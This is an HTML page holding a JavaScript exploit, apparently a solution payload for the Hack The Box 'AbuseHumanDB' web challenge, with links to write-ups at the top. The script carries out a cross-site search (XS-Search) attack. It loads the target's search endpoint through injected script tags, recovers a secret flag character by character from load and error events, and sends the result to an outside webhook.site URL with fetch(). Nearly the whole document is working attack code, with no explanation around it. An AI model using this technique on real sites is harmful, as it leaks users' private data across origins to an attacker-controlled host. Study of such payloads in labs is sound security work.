<!-- https://github.com/lex1010/blog/blob/b32cb0922026cf81e4b67dbdc99add152049ca31/docs/HTB/Web/abusehumandb.md -->
<!-- https://skelter.hashnode.dev/htb-abusehumandb-writeup -->
<!-- https://medium.com/@skelter/htb-abusehumandb-661ea8acb5b6 -->

<html>
<script>
var ip = '127.0.0.1:1337';
var ip2 = '188.166.171.200:30840';
var hook = 'https://webhook.site/3fec1021-2d5a-44ec-a591-8bc65a7157bc';
var flag = 'HTB{';
var abc = '-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
var special = '_%\"\'';
var url1 = `http://${ip2}/api/entries/search?q=`;
async function getPartialFlag(char){
 return new Promise((resolve, reject)=>{
 const script = document.createElement("script");
 script.src = url1+encodeURIComponent(flag+char);
 script.onload = () => char==='}' ? reject(char):resolve(char);
 script.onerror = () => reject(char);
 document.head.appendChild(script);
 });
}
async function getFlag(chars) {
 var b = false; var char;
 for(var i=0; i < chars.length; i++){
 char = special.includes(chars[i]) ? '\\'+chars[i]:chars[i];
 await getPartialFlag(char).then((res) => {flag=flag.concat(res); b = res==='}' ? true:false; i=0} , (res)=> { } );
 if(b) break;}
 fetch(`${hook}?${flag}`, {method:'get'});
};
getFlag(abc);
</script>
<html>

